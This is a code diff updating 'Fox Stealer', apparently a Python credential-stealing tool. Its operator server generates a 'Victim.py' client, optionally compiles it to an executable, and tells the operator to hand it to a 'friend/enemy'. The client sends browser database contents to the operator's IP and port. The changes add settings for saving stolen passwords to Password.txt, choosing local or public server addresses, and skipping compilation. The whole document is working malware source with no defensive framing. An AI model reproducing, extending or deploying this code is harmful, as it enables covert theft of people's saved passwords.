@@ -9,6 +9,7 @@ import time
 import keyboard
 import sys
 import requests
+import json
 
 class console():
     def clear():
@@ -23,10 +24,22 @@ pointerIndex2 = ""
 pointerIndex3 = ""
 enter = False
 Disclaimer = True
+with open("settings.json") as f:
+    data = json.load(f)
+SaveAsTxT = data["SaveAsTxT"]
+Local = data["Local"]
+CompilePyFile = data["CompilePyFile"]
+
+if SaveAsTxT not in ["False", "True"]:
+    sys.exit(1)
+if Local not in ["False", "True"]:
+    sys.exit(1)
+if CompilePyFile not in ["False", "True"]:
+    sys.exit(1)
 
 def down():
     global pointerIndex
-    if pointerIndex == 3:
+    if pointerIndex == 2:
         pass
     else:
         pointerIndex += 1
@@ -42,7 +55,6 @@ def up():
 print(f'''Welcome To: {Fore.LIGHTRED_EX} Fox {Fore.LIGHTBLACK_EX}Stealer! {Fore.RESET}
 
 {pointerIndex1} Start
-{pointerIndex2} Settings
 {pointerIndex3} Exit
 ''')
 
@@ -66,23 +78,16 @@ while in_menu:
         pointerIndex1 = ""
         pointerIndex2 = ">"
         pointerIndex3 = ""
-    if pointerIndex == 3:
-        pointerIndex1 = ""
-        pointerIndex2 = ""
-        pointerIndex3 = ">"
     console.clear()
     print(f'''Welcome To: {Fore.LIGHTRED_EX} Fox {Fore.LIGHTBLACK_EX}Stealer! {Fore.RESET}
 
 {pointerIndex1} Start
-{pointerIndex2} Settings
 {pointerIndex3} Exit
 ''')
     if enter:
         if pointerIndex == 1:
             in_menu = False
         if pointerIndex == 2:
-            pass
-        if pointerIndex == 3:
             while True:
                 console.clear()
                 sys.exit(1)
@@ -124,7 +129,7 @@ except KeyboardInterrupt:
 print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Defining Everything...")
 PORT = 9616
 PUBLIC_IP = requests.get('https://api.ipify.org').content.decode('utf8')
-HEADER = 64
+HEADER = 1024
 SERVER = socket.gethostbyname(socket.gethostname())
 ADDR = (SERVER, PORT)
 FORMAT = 'utf-8'
@@ -144,8 +149,14 @@ def handle_client(conn, addr):
             msg = conn.recv(msg_length).decode(FORMAT)
             if msg == DISCONNECT_MESSAGE:
                 connected = False
-            print(f"[{addr}] {msg}")
-
+            if SaveAsTxT == "True":
+                with open("Password.txt",'a+',encoding = 'utf-8') as f:
+                    text = f.read()
+                    f.write(f'{text}{addr[0]} {msg}\n')
+            if SaveAsTxT == "False":
+                print(f"[{Fore.CYAN}{addr[0]}{Fore.RESET}] {msg}")
+    if SaveAsTxT == "True":
+        print(f"Stole {addr[0]} Data")
     conn.close()
 
 def start():
@@ -153,9 +164,13 @@ def start():
     console.clear()
     print(f"{Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}")
     print("")
+    if SaveAsTxT == "False":
+        print(f"[{Fore.CYAN}WARNING{Fore.RESET}] {Fore.YELLOW}!Disabled Saving Passwords As TxT!{Fore.RESET}")
     print(f"[{Fore.CYAN}SERVER{Fore.RESET}] Server Started!")
-    print("")
-    print(f"[{Fore.CYAN}CLIENT] Give your friend/enemy .exe file from dist folder in {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}Directory")
+    if CompilePyFile == "True":
+        print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Give your friend/enemy .exe file from dist folder in {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}Directory")
+    else:
+        print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Give your friend/enemy .py file Its Located In {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}Directory")
     print(f'''[{Fore.CYAN}LISTENER{Fore.RESET}] Server Info:
 LOCAL IP: {Fore.LIGHTGREEN_EX}{SERVER}{Fore.RESET}
 PUBLIC IP: {Fore.LIGHTGREEN_EX}{PUBLIC_IP}{Fore.RESET}
@@ -166,7 +181,8 @@ PORT: {Fore.LIGHTGREEN_EX}{PORT}{Fore.RESET}
         conn, addr = server.accept()
         thread = threading.Thread(target=handle_client, args=(conn, addr))
         thread.start()
-        print(f"[ACTIVE USERS] {threading.active_count - 1}")
+        ActiveCount = threading.active_count()
+        print(f"[{Fore.CYAN}ACTIVE USERS{Fore.RESET}] {Fore.LIGHTGREEN_EX}{ActiveCount - 1}{Fore.RESET}")
 
 console.clear()
 with open("Victim.py",'w',encoding = 'utf-8') as f:
@@ -181,12 +197,15 @@ import shutil
 from datetime import timezone, datetime, timedelta
 from colorama import Fore
 
-HEADER = 64
+HEADER = 1024
 PORT = 9616
 FORMAT = 'utf-8'
 DISCONNECT_MESSAGE = f"{Fore.LIGHTRED_EX}!DISCONNECT!{Fore.RESET}"
 ''')
-    f.write(f'SERVER = "{PUBLIC_IP}"\n')
+    if Local == "False":
+        f.write(f'SERVER = "{PUBLIC_IP}"\n')
+    else:
+        f.write(f'SERVER = "{SERVER}"\n')
     f.write('''ADDR = (SERVER, PORT)
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -274,6 +293,7 @@ def main():
         send("="*50)
     cursor.close()
     db.close()
+    send(DISCONNECT_MESSAGE)
     try:
         # try to remove the copied db file
         os.remove(filename)
@@ -282,13 +302,13 @@ def main():
 
 if __name__ == "__main__":
     main()''')
-os.system("pyinstaller --onefile Victim.py")
-os.system("rmdir build")
-os.system("del Victim.py")
-os.system("del Victim.spec")
-os.system("copy ./dist/Victim.exe ../")
-os.system("rmdir dist")
+if CompilePyFile == "True":
+    os.system("pyinstaller --onefile Victim.py")
+    os.system("del Victim.py")
+    os.system("del Victim.spec")
 console.clear()
+if CompilePyFile == "False":
+    print(f"[{Fore.CYAN}WARNING{Fore.RESET}] {Fore.YELLOW}!Disabled Compiling!{Fore.RESET}")
 print(f"[{Fore.CYAN}STARTING{Fore.RESET}] Server is starting...")
 print("")
 start()
